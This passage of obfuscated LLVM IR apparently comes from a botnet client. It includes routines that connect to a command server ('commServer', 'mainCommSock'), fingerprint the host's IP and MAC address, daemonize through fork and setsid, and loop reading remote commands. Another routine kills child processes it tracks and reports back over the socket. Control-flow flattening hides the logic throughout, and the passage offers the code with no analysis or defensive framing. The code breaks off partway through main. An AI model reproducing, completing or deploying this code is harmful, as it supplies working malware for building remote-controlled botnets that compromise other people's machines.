  %500 = load i64, i64* %26, align 8
  %501 = getelementptr inbounds i32, i32* %499, i64 %500
  %502 = load i32, i32* %501, align 4
  %503 = call i32 @getpid() #2
  %504 = icmp ne i32 %502, %503
  %505 = select i1 %504, i32 205014448, i32 833340789
  store i32 %505, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  %507 = load i32*, i32** @pids, align 8
  %508 = load i64, i64* %26, align 8
  %509 = getelementptr inbounds i32, i32* %507, i64 %508
  %510 = load i32, i32* %509, align 4
  %511 = call i32 @kill(i32 %510, i32 9) #2
  %512 = load i32, i32* %25, align 4
  %513 = add nsw i32 %512, 1
  store i32 %513, i32* %25, align 4
  store i32 833340789, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  store i32 -1007827240, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = load i64, i64* %26, align 8
  %517 = add i64 %516, 1
  store i64 %517, i64* %26, align 8
  store i32 -156062030, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  %519 = load i32, i32* %25, align 4
  %520 = icmp sgt i32 %519, 0
  %521 = select i1 %520, i32 -499653924, i32 -1559336035
  store i32 %521, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load i32, i32* @mainCommSock, align 4
  %524 = load i32, i32* %25, align 4
  %525 = call i32 (i32, i8*, ...) @sockprintf(i32 %523, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i32 %524)
  store i32 1882917673, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = load i32, i32* @mainCommSock, align 4
  %528 = call i32 (i32, i8*, ...) @sockprintf(i32 %527, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0))
  store i32 1882917673, i32* %switchVar
  br label %loopEnd

; <label>:529:                                    ; preds = %loopEntry
  store i32 1461694224, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 0
  %533 = load i8*, i8** %532, align 8
  %534 = call i32 @strcmp(i8* %533, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.75, i32 0, i32 0)) #10
  %535 = icmp ne i32 %534, 0
  %536 = select i1 %535, i32 -1256432509, i32 -246398574
  store i32 %536, i32* %switchVar
  br label %loopEnd

; <label>:537:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:538:                                    ; preds = %loopEntry
  store i32 1322387426, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %538, %530, %529, %526, %522, %518, %515, %514, %506, %498, %491, %486, %485, %478, %477, %466, %462, %461, %459, %445, %441, %438, %433, %432, %427, %423, %422, %417, %395, %394, %387, %383, %376, %372, %365, %358, %351, %344, %340, %333, %332, %322, %318, %317, %315, %302, %298, %295, %290, %289, %284, %261, %260, %253, %249, %242, %235, %228, %221, %214, %207, %203, %196, %195, %189, %185, %184, %182, %173, %169, %166, %154, %153, %146, %142, %135, %134, %132, %131, %127, %125, %118, %117, %113, %106, %104, %103, %99, %97, %90, %89, %85, %74, %73, %69, %62, %59, %55, %48, %43, %36, %33, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1494330605, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1494330605, label %first
    i32 1461711819, label %8
    i32 -1036122660, label %11
    i32 -5167233, label %17
    i32 1340213597, label %18
    i32 1004612437, label %21
    i32 -1847070675, label %32
    i32 1432638736, label %39
    i32 -1348025055, label %47
    i32 -2145235353, label %48
    i32 28027117, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp ne i32 %.reload, 0
  %7 = select i1 %6, i32 1461711819, i32 -1036122660
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i32, i32* @mainCommSock, align 4
  %10 = call i32 @close(i32 %9)
  store i32 0, i32* @mainCommSock, align 4
  store i32 -1036122660, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* @currentServer, align 4
  %13 = add nsw i32 %12, 1
  %14 = sext i32 %13 to i64
  %15 = icmp eq i64 %14, 1
  %16 = select i1 %15, i32 -5167233, i32 1340213597
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 0, i32* @currentServer, align 4
  store i32 1004612437, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* @currentServer, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* @currentServer, align 4
  store i32 1004612437, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %23 = load i32, i32* @currentServer, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %24
  %26 = load i8*, i8** %25, align 8
  %27 = call i8* @strcpy(i8* %22, i8* %26) #2
  store i32 46, i32* %3, align 4
  %28 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %29 = call i8* @strchr(i8* %28, i32 58) #10
  %30 = icmp ne i8* %29, null
  %31 = select i1 %30, i32 -1847070675, i32 1432638736
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %34 = call i8* @strchr(i8* %33, i32 58) #10
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @atoi(i8* %35) #10
  store i32 %36, i32* %3, align 4
  %37 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %38 = call i8* @strchr(i8* %37, i32 58) #10
  store i8 0, i8* %38, align 1
  store i32 1432638736, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %40, i32* @mainCommSock, align 4
  %41 = load i32, i32* @mainCommSock, align 4
  %42 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %43 = load i32, i32* %3, align 4
  %44 = call i32 @connectTimeout(i32 %41, i8* %42, i32 %43, i32 30)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -2145235353, i32 -1348025055
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1, i32* %1, align 4
  store i32 28027117, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 28027117, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %48, %47, %39, %32, %21, %18, %17, %11, %8, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  store i32 %13, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -772823279, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -772823279, label %first
    i32 -1490118743, label %16
    i32 1771983412, label %17
    i32 427608483, label %31
    i32 -369160868, label %32
    i32 -698071485, label %39
    i32 853224229, label %40
    i32 1186139354, label %45
    i32 646191233, label %51
    i32 1512715353, label %56
    i32 -789229513, label %58
    i32 -1630037432, label %64
    i32 285163621, label %67
    i32 -1238680530, label %69
    i32 -919930043, label %71
    i32 833846868, label %78
    i32 28735054, label %86
    i32 -814753670, label %90
    i32 612311142, label %102
    i32 2020584, label %105
    i32 -592422489, label %106
    i32 -366347217, label %109
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %14 = icmp eq i32 %.reload, -1
  %15 = select i1 %14, i32 -1490118743, i32 1771983412
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -366347217, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.76, i32 0, i32 0)) #2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %22 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = call zeroext i16 @htons(i16 zeroext 53) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  %25 = load i32, i32* %2, align 4
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %25, %struct.sockaddr* %26, i32 16)
  store i32 %27, i32* %4, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp eq i32 %28, -1
  %30 = select i1 %29, i32 427608483, i32 -369160868
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -366347217, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 16, i32* %6, align 4
  %33 = load i32, i32* %2, align 4
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %35 = call i32 @getsockname(i32 %33, %struct.sockaddr* %34, i32* %6) #2
  store i32 %35, i32* %4, align 4
  %36 = load i32, i32* %4, align 4
  %37 = icmp eq i32 %36, -1
  %38 = select i1 %37, i32 -698071485, i32 853224229
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 -366347217, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %42 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %41, i32 0, i32 0
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %44 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.77, i32 0, i32 0), i32 0)
  store i32 %44, i32* %7, align 4
  store i32 1186139354, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %47 = load i32, i32* %7, align 4
  %48 = call i8* @fdgets(i8* %46, i32 4096, i32 %47)
  %49 = icmp ne i8* %48, null
  %50 = select i1 %49, i32 646191233, i32 -919930043
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %53 = call i8* @strstr(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0)) #10
  %54 = icmp ne i8* %53, null
  %55 = select i1 %54, i32 1512715353, i32 -1238680530
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %57, i8** %9, align 8
  store i32 -789229513, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i8*, i8** %9, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp ne i32 %61, 9
  %63 = select i1 %62, i32 -1630037432, i32 285163621
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %65 = load i8*, i8** %9, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 1
  store i8* %66, i8** %9, align 8
  store i32 -789229513, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8*, i8** %9, align 8
  store i8 0, i8* %68, align 1
  store i32 -919930043, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 4096, i32 16, i1 false)
  store i32 1186139354, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %7, align 4
  %73 = call i32 @close(i32 %72)
  %74 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %75 = load i8, i8* %74, align 16
  %76 = icmp ne i8 %75, 0
  %77 = select i1 %76, i32 833846868, i32 -592422489
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %80 = bitcast %union.anon.6* %79 to [16 x i8]*
  %81 = getelementptr inbounds [16 x i8], [16 x i8]* %80, i32 0, i32 0
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %83 = call i8* @strcpy(i8* %81, i8* %82) #2
  %84 = load i32, i32* %2, align 4
  %85 = call i32 (i32, i64, ...) @ioctl(i32 %84, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  store i32 28735054, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  %87 = load i32, i32* %10, align 4
  %88 = icmp slt i32 %87, 6
  %89 = select i1 %88, i32 -814753670, i32 2020584
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %92 = bitcast %union.anon.7* %91 to %struct.sockaddr*
  %93 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %92, i32 0, i32 1
  %94 = getelementptr inbounds [14 x i8], [14 x i8]* %93, i32 0, i32 0
  %95 = load i32, i32* %10, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = load i32, i32* %10, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %100
  store i8 %98, i8* %101, align 1
  store i32 612311142, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %10, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %10, align 4
  store i32 28735054, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 -592422489, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -366347217, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %1, align 4
  ret i32 %110

loopEnd:                                          ; preds = %106, %105, %102, %90, %86, %78, %71, %69, %67, %64, %58, %56, %51, %45, %40, %39, %32, %31, %17, %16, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [50 x i8], align 16
  %9 = alloca %struct._IO_FILE*, align 8
  %10 = alloca i32, align 4
  %11 = alloca [11 x i8], align 1
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca [4096 x i8], align 16
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca [10 x i8*], align 16
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %28 = bitcast [50 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %28, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @main.ismokeweed, i32 0, i32 0), i64 50, i32 16, i1 false)
  %29 = load i32, i32* %6, align 4
  store i32 %29, i32* %10, align 4
  %30 = bitcast [11 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %30, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @main.r00t3d, i32 0, i32 0), i64 11, i32 1, i1 false)
  %31 = getelementptr inbounds [50 x i8], [50 x i8]* %8, i32 0, i32 0
  %32 = call %struct._IO_FILE* @fopen(i8* %31, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.79, i32 0, i32 0))
  store %struct._IO_FILE* %32, %struct._IO_FILE** %9, align 8
  %33 = getelementptr inbounds [11 x i8], [11 x i8]* %11, i32 0, i32 0
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %35 = call i64 @fwrite(i8* %33, i64 1, i64 11, %struct._IO_FILE* %34)
  %36 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %37 = call i32 @fileno(%struct._IO_FILE* %36) #2
  %38 = call i32 (i32, i32, ...) bitcast (i32 (...)* @fchmod to i32 (i32, i32, ...)*)(i32 %37, i32 3071)
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %40 = call i32 @fileno(%struct._IO_FILE* %39) #2
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = call i32 (i32, i64, ...) @ioctl(i32 %40, i64 %42, i32* %10) #2
  %44 = load %struct._IO_FILE*, %struct._IO_FILE** %9, align 8
  %45 = call i32 @fclose(%struct._IO_FILE* %44)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = call i32 @getpid() #2
  %48 = xor i32 %46, %47
  call void @srand(i32 %48) #2
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %50 = call i32 @getpid() #2
  %51 = xor i32 %49, %50
  call void @init_rand(i32 %51)
  %52 = call i32 @getOurIP()
  %53 = call i32 @fork() #2
  store i32 %53, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 1196534643, i32* %switchVar
  %.reg2mem3 = alloca i1
  %.reg2mem5 = alloca i1
  %.reg2mem7 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1196534643, label %first
    i32 -587647034, label %56
    i32 -1911556593, label %59
    i32 1829757454, label %63
    i32 163359049, label %67
    i32 -735053380, label %68
    i32 -706095494, label %72
    i32 -1077433841, label %73
    i32 -2031465139, label %75
    i32 86126998, label %76
    i32 -1164717545, label %77
    i32 1047122390, label %79
    i32 -2035640828, label %80
    i32 948891894, label %84
    i32 1052260926, label %88
    i32 2104408980, label %90
    i32 -400179953, label %91
    i32 262134783, label %97
    i32 696393759, label %98
    i32 -783985071, label %104
    i32 1788396513, label %113
    i32 1891469068, label %116
    i32 -1143705404, label %122
    i32 -1700160770, label %133
    i32 801022343, label %136
    i32 2017418957, label %149
    i32 -184833720, label %155
    i32 1987345501, label %165
    i32 639654382, label %168
    i32 826151506, label %172
    i32 -733163582, label %173
    i32 -1235753494, label %176
    i32 -573664080, label %186
    i32 1231678413, label %189
    i32 1921759130, label %195
    i32 -581294868, label %196
    i32 -633964847, label %203
    i32 401831863, label %206
    i32 -1709488649, label %212
    i32 -178949984, label %217
    i32 -976735557, label %219
    i32 -1151476160, label %222
    i32 204724885, label %228
    i32 -830601617, label %229
    i32 1786359480, label %238
    i32 1147994544, label %248
    i32 -232538637, label %257
    i32 -381029224, label %259
    i32 178780686, label %265
    i32 400199495, label %267
    i32 289676771, label %273
    i32 -1432384093, label %278
    i32 1585948505, label %280
    i32 351863942, label %283
    i32 -1758501687, label %288
    i32 -698627327, label %293
    i32 1905617591, label %302
    i32 593964455, label %307
    i32 528726967, label %311
    i32 1635495183, label %317
    i32 792624128, label %340
    i32 -1076626947, label %342
    i32 908554594, label %348
    i32 -1956777179, label %349
    i32 -1727833956, label %354
    i32 779954150, label %359
    i32 961242140, label %362
    i32 497104837, label %363
    i32 -2060640576, label %364
    i32 -286570555, label %365
    i32 680452752, label %366
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %54 = icmp ne i32 %.reload, 0
  %55 = select i1 %54, i32 -587647034, i32 -1911556593
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i32, i32* %12, align 4
  %58 = call i32 @waitpid(i32 %57, i32* %14, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i32, i32* %12, align 4
  %61 = icmp ne i32 %60, 0
  %62 = select i1 %61, i32 -1164717545, i32 1829757454
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = call i32 @fork() #2
  store i32 %64, i32* %13, align 4
  %65 = icmp ne i32 %64, 0
  %66 = select i1 %65, i32 163359049, i32 -735053380
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %13, align 4
  %70 = icmp ne i32 %69, 0
  %71 = select i1 %70, i32 -1077433841, i32 -706095494
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  store i32 -2031465139, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0))
  store i32 -2031465139, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  store i32 86126998, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  store i32 1047122390, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0))
  store i32 1047122390, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 -2035640828, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  %81 = call i32 @setsid() #2
  %82 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i32 0, i32 0)) #2
  %83 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 948891894, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = call i32 @initConnection()
  %86 = icmp ne i32 %85, 0
  %87 = select i1 %86, i32 1052260926, i32 2104408980
  store i32 %87, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = call i32 @sleep(i32 5)
  store i32 948891894, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 -400179953, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %15, i32 0, i32 0
  %94 = call i32 @recvLine(i32 %92, i8* %93, i32 4096)
  store i32 %94, i32* %16, align 4
  %95 = icmp ne i32 %94, -1
  %96 = select i1 %95, i32 262134783, i32 -286570555
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  store i32 0, i32* %17, align 4
  store i32 696393759, i32* %switchVar
  br label %loopEnd

; <label>:98:                                     ; preds = %loopEntry
  %99 = load i32, i32* %17, align 4
  %100 = sext i32 %99 to i64
  %101 = load i64, i64* @numpids, align 8
  %102 = icmp ult i64 %100, %101
  %103 = select i1 %102, i32 -783985071, i32 -1235753494
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32*, i32** @pids, align 8
  %106 = load i32, i32* %17, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i32, i32* %105, i64 %107
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @waitpid(i32 %109, i32* null, i32 1)
  %111 = icmp sgt i32 %110, 0
  %112 = select i1 %111, i32 1788396513, i32 826151506
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %17, align 4
  %115 = add nsw i32 %114, 1
  store i32 %115, i32* %19, align 4
  store i32 1891469068, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = load i32, i32* %19, align 4
  %118 = zext i32 %117 to i64
  %119 = load i64, i64* @numpids, align 8
  %120 = icmp ult i64 %118, %119
  %121 = select i1 %120, i32 -1143705404, i32 801022343
  store i32 %121, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %19, align 4
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds i32, i32* %123, i64 %125
  %127 = load i32, i32* %126, align 4
  %128 = load i32*, i32** @pids, align 8
  %129 = load i32, i32* %19, align 4
  %130 = sub i32 %129, 1
  %131 = zext i32 %130 to i64
  %132 = getelementptr inbounds i32, i32* %128, i64 %131
  store i32 %127, i32* %132, align 4
  store i32 -1700160770, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i32, i32* %19, align 4
  %135 = add i32 %134, 1
  store i32 %135, i32* %19, align 4
  store i32 1891469068, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %19, align 4
  %139 = sub i32 %138, 1
  %140 = zext i32 %139 to i64
  %141 = getelementptr inbounds i32, i32* %137, i64 %140
  store i32 0, i32* %141, align 4
  %142 = load i64, i64* @numpids, align 8
  %143 = add i64 %142, -1
  store i64 %143, i64* @numpids, align 8
  %144 = load i64, i64* @numpids, align 8
  %145 = add i64 %144, 1
  %146 = mul i64 %145, 4
  %147 = call noalias i8* @malloc(i64 %146) #2
  %148 = bitcast i8* %147 to i32*
  store i32* %148, i32** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 2017418957, i32* %switchVar
  br label %loopEnd

; <label>:149:                                    ; preds = %loopEntry
  %150 = load i32, i32* %19, align 4
